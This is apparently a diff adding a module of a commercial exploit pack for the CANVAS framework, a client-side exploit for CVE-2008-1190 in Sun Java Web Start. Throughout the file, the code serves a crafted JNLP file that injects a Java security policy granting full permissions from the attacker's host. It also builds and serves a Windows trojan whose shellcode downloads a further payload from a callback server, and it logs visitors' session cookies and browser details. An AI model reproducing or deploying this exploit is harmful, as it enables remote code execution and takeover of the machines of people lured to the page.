@@ -1,0 +1,268 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2010
+#
+
+
+import sys
+
+if '.' not in sys.path: 
+	sys.path.append('.')
+
+from exploitutils import *
+from tcpexploit import *
+from httpclientside import httpclientside
+from libs.canvasos import *
+from MOSDEF import pelib 
+
+import struct
+
+# GUI info
+NAME = "Sun Java Web Start Untrusted Application Vulnerability"
+
+DESCRIPTION = "Vulnerability in Sun Java WebStart"
+DOCUMENTATION = {}
+DOCUMENTATION['Date public'] = "2008.03.06"
+DOCUMENTATION['VersionsAffected'] = "Sun JDK/JRE 6 < Update 5"
+DOCUMENTATION["CVE Name"] = "CVE-2008-1190"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1190"
+
+VERSION='1.0'
+
+GTK2_DIALOG='dialog.glade2'
+
+PROPERTY={}
+PROPERTY['TYPE'] = 'Exploit'
+PROPERTY['SITE'] = 'Clientside'
+PROPERTY['ARCH'] = [ ["Windows"] ]
+
+NOTES="""
+Usage:
+.\commandlineInterface.py -p 5555 -v 1
+.\exploits\httpserver\httpserver.py -v 1 -O singleexploit:d2sec_javaws -l 192.168.1.1 -d 5555 -p 80
+"""
+
+CHANGELOG="""
+"""
+
+targets = {    
+    0 : ["All"], 
+}
+
+class theexploit(tcpexploit,httpclientside):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        httpclientside.__init__(self)
+        self.clientversion = 1        
+        self.badstring = ""
+        self.jnlpfile = "app.jnlp"
+        self.jnlpstartfile = "start.jnlp"
+        self.jarfile = "app.jar"
+        self.policyfile = "javaws.policy"
+        self.name = NAME 
+        self.filename = self.jnlpstartfile
+        self.trojannamew = "app.exe"
+        self.trojannamel = "app.bin"
+        return
+
+    def makepolicy(self):
+    	
+        filedata = """
+grant codeBase "http://SERVERHOST:SERVERPORT/-" {
+    permission java.security.AllPermission;
+};
+"""
+
+      	filedata = filedata.replace('SERVERHOST', self.callback.ip)
+      	filedata = filedata.replace('SERVERPORT', str(self.callback.port))
+
+      	if self.useSSL:
+      		filedata = filedata.replace('http:', 'https:')
+      	
+        return filedata
+        
+
+    def makefile(self):
+
+        filedata = """
+<?xml version="1.0" encoding="utf-8"?>
+
+<jnlp spec="1.0+" codebase="http://SERVERHOST:SERVERPORT" href="JNLPFILE?CANVASCOOKIE">
+
+  <information>
+    <title>Application</title>
+    <vendor>DSquare Security</vendor>    
+    <description>Application</description>    
+    <offline-allowed/>
+  </information>
+  
+  <resources>
+    <j2se version="1.3+"/>
+    <jar href="JARFILE?CANVASCOOKIE"/>
+    <property name=sun.java2d.noddraw value='true\\" -Djava.security.policy=http://SERVERHOST:SERVERPORT/POLICYFILE -Dsun.java2d.noddraw=\\'/>     
+  </resources>
+  <application-desc main-class="app">
+    <argument>http://SERVERHOST:SERVERPORT</argument>
+    <argument>CANVASCOOKIE</argument>  
+  </application-desc>
+  
+</jnlp>
+"""
+
+      	filedata = filedata.replace('SERVERHOST', self.callback.ip)
+      	filedata = filedata.replace('SERVERPORT', str(self.callback.port))
+      	filedata = filedata.replace('CANVASCOOKIE', self.CANSessID)
+      	filedata = filedata.replace('JARFILE', self.jarfile)
+      	filedata = filedata.replace('JNLPFILE', self.jnlpfile)
+      	filedata = filedata.replace('POLICYFILE', self.policyfile)
+      	
+      	if self.useSSL:
+      		filedata = filedata.replace('http:', 'https:')
+      	       
+        return filedata
+
+    def makefile2(self):
+
+        filedata = """
+<?xml version="1.0" encoding="utf-8"?>
+
+<jnlp spec="1.0+" codebase="http://SERVERHOST:SERVERPORT" href="JNLPFILE?CANVASCOOKIE">
+
+  <information>
+    <title>Application</title>
+    <vendor>DSquare Security</vendor>    
+    <description>Application</description>    
+    <offline-allowed/>
+  </information>
+  
+  <resources>
+    <j2se version="1.3+"/>
+    <jar href="JARFILE?CANVASCOOKIE"/>
+
+  </resources>
+  <application-desc main-class="app">
+    <argument>http://SERVERHOST:SERVERPORT</argument>    
+    <argument>CANVASCOOKIE</argument> 
+  </application-desc>
+  
+</jnlp>
+"""
+
+      	filedata = filedata.replace('SERVERHOST', self.callback.ip)
+      	filedata = filedata.replace('SERVERPORT', str(self.callback.port))
+      	filedata = filedata.replace('CANVASCOOKIE', self.CANSessID)
+      	filedata = filedata.replace('JNLPFILE', self.jnlpfile)
+      	filedata = filedata.replace('JARFILE', self.jarfile)
+
+      	if self.useSSL:
+      		filedata = filedata.replace('http:', 'https:')
+       
+        return filedata
+        
+    def maketrojan(self):
+        host = self.callback.ip
+        port = self.callback.port
+
+	sc = shellcodeGenerator.win32()
+        sc.addAttr("findeipnoesp", {"subespval":0x1000})                
+                        	
+        if self.useSSL:
+            ssl = "s"
+        else:
+            ssl = ""                
+            
+        sc.addAttr("httpGetShellcode", {"URL":"http%s://%s:%d/w" % (ssl, host, port)})
+	shellcode = sc.get()        
+	myPElib = pelib.PElib()
+	
+	self.mosdeftrojan = myPElib.createPEFileBuf(shellcode)
+        
+        self.log("Writing out %d bytes to %s"%(len(self.mosdeftrojan), self.trojannamew))
+        file(self.trojannamew, "wb").write(self.mosdeftrojan)
+        self.setInfo("%s - done"%(NAME))
+        ret = len(self.mosdeftrojan) != 0
+        
+        return ret
+
+    def makesploit(self, clientheader, clientbody):        
+        from libs.spkproxy import header, body
+        h = header('SERVER')
+        b = body()	
+	
+        user_agent  = clientheader.getStrValue(['User-Agent'])
+	
+        self.CANSessID = clientheader.getStrValue(['Cookie'])
+        # self.CANSessID will be the full CANSessID=1234... string
+        if (self.CANSessID and self.CANSessID not in ['0'] and self.CANSessID.count('CANSessID')):
+            self.log("Scavenged original CANSessID from client [%s]" % self.CANSessID)        
+            self.log("User agent of connecting host: %s" % user_agent)      	
+	
+        self.maketrojan()
+                
+        # JNLP start file request
+        if clientheader.URL.count(self.filename):
+            self.log("Sending JNLP start file: %s" % (self.filename))
+            h.addHeader('Content-Type','application/x-java-jnlp-file')
+            sploitstring = self.makefile()
+            b.setBody(sploitstring)                           
+
+        # JNLP file request
+        elif clientheader.URL.count(self.jnlpfile):
+            self.log("Sending JNLP file: %s" % (self.jnlpfile))
+            h.addHeader('Content-Type','application/x-java-jnlp-file')
+            sploitstring = self.makefile2()            
+            b.setBody(sploitstring)                           
+                       	
+        # JAR file request
+        elif clientheader.URL.count(self.jarfile):
+            self.log("Sending JAR file")            
+            f = open(os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_javaws/" + self.jarfile, "rb")
+            sploitstring = f.read()
+            f.close()            
+            self.log("Sending %d bytes" % len(sploitstring))
+            h.addHeader("Content-type", "binary/octet-stream")
+            h.addHeader("Connection", "close")
+            b.setBody(sploitstring)            
+
+        # JAVA Security Policy file request
+        elif clientheader.URL.count(self.policyfile):            
+            self.log("Sending JAVA Security Policy file")        	
+            sploitstring = self.makepolicy()            
+            b.setBody(sploitstring)               
+        	
+        # Windows MOSDEF trojan file request
+        elif clientheader.URL.count(self.trojannamew):
+            self.log("Sending MOSDEF trojan")
+            f = open(self.trojannamew, "rb")
+            sploitstring = f.read()
+            f.close()
+            os.remove(self.trojannamew)
+            self.log("Sending %d bytes" % len(sploitstring))
+            h.addHeader("Content-type", "binary/octet-stream")
+            h.addHeader("Connection", "close")
+            b.setBody(sploitstring)            
+
+        # Redirect to JNLP file
+        else:
+            self.log('Redirecting to self')
+            h.status = '302'
+            h.addHeader('Location', self.filename)
+            h.addHeader('Content-Type', 'binary/octet-stream')
+            
+        return h, b
+
+    def neededListenerTypes(self):
+        from canvasengine import HTTPMOSDEF
+        return [HTTPMOSDEF]
+                           
+    def run(self):        
+        return 1
+
+if __name__=='__main__':
+    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
+    app = theexploit()
+    ret = standard_callback_commandline(app)
